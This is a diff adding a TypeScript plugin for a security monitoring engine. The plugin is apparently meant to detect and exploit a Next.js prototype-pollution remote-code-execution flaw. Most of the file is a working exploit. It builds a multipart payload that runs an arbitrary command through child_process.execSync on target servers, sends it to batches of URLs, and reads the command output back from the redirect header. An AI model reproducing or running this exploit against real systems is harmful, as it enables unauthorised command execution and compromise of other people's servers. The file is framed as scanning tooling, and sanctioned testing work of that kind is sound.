@@ -1,0 +1,492 @@
+/**
+ * Next.js Prototype Pollution RCE Scanner
+ *
+ * @plugin nextjs_rce_scanner
+ * @name Next.js RCE Scanner
+ * @version 1.0.7
+ * @author Sentinel Team
+ * @main_category agent
+ * @monitor_type risk
+ * @input_mode asset
+ * @target_asset_types ["web"]
+ * @category exploit
+ * @default_severity critical
+ * @tags nextjs, rce, prototype-pollution, cve, exploit, capability:fetch, capability:monitor-events, monitor:results-stream-v2
+ * @description Detect and exploit Next.js prototype pollution RCE vulnerability
+ * @target_sources ["surface_asset","bounty_asset","scope"]
+ * @seed_bindings []
+ */
+import {
+  observedFetch as fetch,
+  runMonitorTool,
+  monitorToolOutputSchema,
+} from "../../shared/monitor_tool_runner.ts";
+
+/**
+ * Tool input parameters
+ */
+interface ToolInput {
+  targets: string[];
+  command?: string;
+  detectOnly?: boolean;
+}
+
+interface ToolOutput {
+  success: boolean;
+  data?: {
+    results: Array<{
+      url: string;
+      vulnerable: boolean;
+      commandOutput?: string;
+      error?: string;
+      responseTime?: number;
+    }>;
+    summary: {
+      total: number;
+      vulnerable: number;
+      scanned: number;
+    };
+  };
+  error?: string;
+}
+
+type PluginGlobals = typeof globalThis & {
+  get_input_schema?: typeof get_input_schema;
+  get_output_schema?: typeof get_output_schema;
+  analyze?: typeof analyze;
+};
+
+const pluginGlobals = globalThis as PluginGlobals;
+
+/**
+ * 【方案2】导出参数 Schema 函数
+ *
+ * 插件自己定义需要的参数，引擎加载后调用此函数获取。
+ */
+export function get_input_schema() {
+  return {
+    type: "object",
+    required: ["targets"],
+    properties: {
+      targets: {
+        type: "array",
+        items: { type: "string" },
+        description:
+          "目标域名或URL列表，如 ['https://example.com', 'target.com']",
+      },
+      command: {
+        type: "string",
+        description: "要执行的命令（可选，默认为 'id'）",
+        default: "id",
+      },
+      detectOnly: {
+        type: "boolean",
+        description: "是否只检测不执行命令（true=仅检测，false=执行命令）",
+        default: false,
+      },
+    },
+  };
+}
+
+// 绑定到 globalThis
+pluginGlobals.get_input_schema = get_input_schema;
+
+/**
+ * Export output schema
+ */
+function getBusinessOutputSchema() {
+  return {
+    type: "object",
+    properties: {
+      success: {
+        type: "boolean",
+        description: "Whether the operation succeeded",
+      },
+      data: {
+        type: "object",
+        properties: {
+          results: {
+            type: "array",
+            items: {
+              type: "object",
+              properties: {
+                url: { type: "string" },
+                vulnerable: { type: "boolean" },
+                commandOutput: { type: "string" },
+              },
+            },
+            description: "Scan results",
+          },
+          summary: {
+            type: "object",
+            properties: {
+              total: { type: "integer" },
+              vulnerable: { type: "integer" },
+              scanned: { type: "integer" },
+            },
+          },
+        },
+      },
+      error: { type: "string", description: "Error message if failed" },
+    },
+  };
+}
+
+pluginGlobals.get_output_schema = get_output_schema;
+
+/**
+ * Generate exploit payload
+ * @param command Command to execute
+ * @returns Multipart/form-data request body with payload
+ */
+function generateExploitPayload(command: string): string {
+  const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
+
+  const payload = {
+    then: "$1:__proto__:then",
+    status: "resolved_model",
+    reason: -1,
+    value: '{"then":"$B1337"}',
+    _response: {
+      _prefix: `var res=process.mainModule.require('child_process').execSync('${command}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`,
+      _chunks: "$Q2",
+      _formData: {
+        get: "$1:constructor:constructor",
+      },
+    },
+  };
+
+  const parts = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="0"',
+    "",
+    JSON.stringify(payload),
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="1"',
+    "",
+    '"$@0"',
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="2"',
+    "",
+    "[]",
+    `--${boundary}--`,
+    "",
+  ];
+
+  return parts.join("\r\n");
+}
+
+/**
+ * Parse x-action-redirect header to extract command output
+ */
+function parseRedirectHeader(redirectHeader: string | null): string | null {
+  if (!redirectHeader) return null;
+
+  try {
+    const match = redirectHeader.match(/\/login\?a=([^;]+)/);
+    if (match && match[1]) {
+      return decodeURIComponent(match[1].trim());
+    }
+    return null;
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Parse response to extract command execution result
+ */
+function parseCommandOutput(
+  responseText: string,
+  redirectHeader: string | null,
+): string | null {
+  // Prefer header parsing (more reliable)
+  const headerResult = parseRedirectHeader(redirectHeader);
+  if (headerResult) {
+    return headerResult;
+  }
+
+  try {
+    // Fallback: extract from response body
+    const redirectMatch = responseText.match(
+      /NEXT_REDIRECT;push;\/login\?a=([^;]+);307/,
+    );
+    if (redirectMatch && redirectMatch[1]) {
+      return decodeURIComponent(redirectMatch[1]);
+    }
+
+    const errorMatch = responseText.match(
+      /digest:\s*['"]NEXT_REDIRECT;push;\/login\?a=([^'"]+)['"]/,
+    );
+    if (errorMatch && errorMatch[1]) {
+      return decodeURIComponent(errorMatch[1]);
+    }
+
+    if (responseText.includes("VULNERABLE_DETECTED")) {
+      return "VULNERABLE_DETECTED";
+    }
+
+    return null;
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Check if command output indicates successful exploitation
+ */
+function isExploitSuccessful(output: string | null, command: string): boolean {
+  if (!output) return false;
+
+  // id command signature detection
+  if (command === "id" || command.includes("id")) {
+    return /uid=\d+/.test(output) || /gid=\d+/.test(output);
+  }
+
+  // whoami command signature
+  if (command === "whoami") {
+    return (
+      output.length > 0 &&
+      !output.includes("error") &&
+      !output.includes("not found")
+    );
+  }
+
+  // General detection: has output and not an error message
+  return (
+    output.length > 0 &&
+    output !== "VULNERABLE_DETECTED" &&
+    !output.toLowerCase().includes("error") &&
+    !output.toLowerCase().includes("not found")
+  );
+}
+
+/**
+ * Send exploit request
+ */
+async function sendExploitRequest(
+  url: string,
+  payload: string,
+): Promise<{
+  responseText: string;
+  status: number;
+  responseTime: number;
+  redirectHeader: string | null;
+  error?: string;
+}> {
+  const startTime = Date.now();
+
+  try {
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        Host: new URL(url).host,
+        "Next-Action": "x",
+        "X-Nextjs-Request-Id": "b5dce965",
+        "Content-Type":
+          "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
+        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
+        "Content-Length": payload.length.toString(),
+        "User-Agent":
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      },
+      body: payload,
+      timeout: 15000,
+    });
+
+    const responseTime = Date.now() - startTime;
+    const responseText = await response.text();
+    const redirectHeader = response.headers.get("x-action-redirect");
+
+    return {
+      responseText,
+      status: response.status,
+      responseTime,
+      redirectHeader,
+    };
+  } catch (error: any) {
+    const responseTime = Date.now() - startTime;
+    return {
+      responseText: "",
+      status: 0,
+      responseTime,
+      redirectHeader: null,
+      error: error.message || "Request failed",
+    };
+  }
+}
+
+/**
+ * Normalize URL, return list of URLs to test if no protocol specified
+ */
+function normalizeTargetUrls(target: string): string[] {
+  const trimmed = target.trim();
+
+  if (trimmed.startsWith("http://") || trimmed.startsWith("https://")) {
+    return [trimmed];
+  }
+
+  // No protocol, test both https and http
+  return [`https://${trimmed}`, `http://${trimmed}`];
+}
+
+/**
+ * Run tasks with bounded concurrency. Host enforces global direct-fetch limit.
+ */
+async function runWithConcurrency<T>(
+  tasks: (() => Promise<T>)[],
+  concurrency: number,
+): Promise<void> {
+  const limit = Math.max(1, Math.min(concurrency, tasks.length));
+  let nextIndex = 0;
+
+  const workers = Array.from({ length: limit }, async () => {
+    while (true) {
+      const index = nextIndex++;
+      if (index >= tasks.length) {
+        return;
+      }
+      try {
+        await tasks[index]();
+      } catch {
+        // Individual probes are best-effort; keep swallowing failures.
+      }
+    }
+  });
+
+  await Promise.all(workers);
+}
+
+/**
+ * Main analysis function
+ */
+async function analyzeBusiness(input: ToolInput): Promise<ToolOutput> {
+  try {
+    // Validate input
+    if (!input || !input.targets || !Array.isArray(input.targets)) {
+      return {
+        success: false,
+        error:
+          "Invalid input: targets parameter is required and must be an array",
+      };
+    }
+
+    // Filter out empty strings
+    const validTargets = input.targets.filter(
+      (t) => typeof t === "string" && t.trim().length > 0,
+    );
+    if (validTargets.length === 0) {
+      return {
+        success: false,
+        error:
+          "Invalid input: targets array must contain at least one non-empty string",
+      };
+    }
+
+    const targets = validTargets;
+    const command = input.command || "id";
+    const detectOnly = input.detectOnly || false;
+
+    const results: Array<{
+      url: string;
+      vulnerable: boolean;
+      commandOutput?: string;
+      responseTime?: number;
+    }> = [];
+
+    let scannedCount = 0;
+
+    // Single target scan task
+    const scanTarget = async (target: string): Promise<void> => {
+      const urlsToTest = normalizeTargetUrls(target);
+
+      for (const targetUrl of urlsToTest) {
+        try {
+          // Validate URL format
+          try {
+            new URL(targetUrl);
+          } catch {
+            continue;
+          }
+
+          scannedCount++;
+
+          const effectiveCommand = detectOnly ? "id" : command;
+          const payload = generateExploitPayload(effectiveCommand);
+          const requestResult = await sendExploitRequest(targetUrl, payload);
+
+          if (requestResult.error) {
+            continue;
+          }
+
+          const commandOutput = parseCommandOutput(
+            requestResult.responseText,
+            requestResult.redirectHeader,
+          );
+
+          if (detectOnly) {
+            const vulnerable = isExploitSuccessful(commandOutput, "id");
+            if (vulnerable) {
+              results.push({
+                url: targetUrl,
+                vulnerable: true,
+                commandOutput: `Vulnerability detected! Command output: ${commandOutput}`,
+                responseTime: requestResult.responseTime,
+              });
+              return;
+            }
+          } else {
+            const vulnerable = isExploitSuccessful(commandOutput, command);
+            if (vulnerable) {
+              results.push({
+                url: targetUrl,
+                vulnerable: true,
+                commandOutput: commandOutput || undefined,
+                responseTime: requestResult.responseTime,
+              });
+              return;
+            }
+          }
+        } catch {
+          continue;
+        }
+      }
+    };
+
+    // Create all scan tasks
+    const tasks = targets.map((target) => () => scanTarget(target));
+
+    // Execute in batches
+    await runWithConcurrency(tasks, 3);
+
+    // Generate summary
+    const summary = {
+      total: targets.length,
+      vulnerable: results.length,
+      scanned: scannedCount,
+    };
+
+    return {
+      success: true,
+      data: {
+        results,
+        summary,
+      },
+    };
+  } catch (error: any) {
+    return {
+      success: false,
+      error: error instanceof Error ? error.message : String(error),
+    };
+  }
+}
+
+// Export to globalThis for plugin engine
+pluginGlobals.analyze = analyze;
+
+export function get_output_schema() {
+  return monitorToolOutputSchema(getBusinessOutputSchema());
+}
+export async function analyze(input: ToolInput): Promise<ToolOutput> {
+  return await runMonitorTool(input, get_input_schema(), analyzeBusiness);
+}
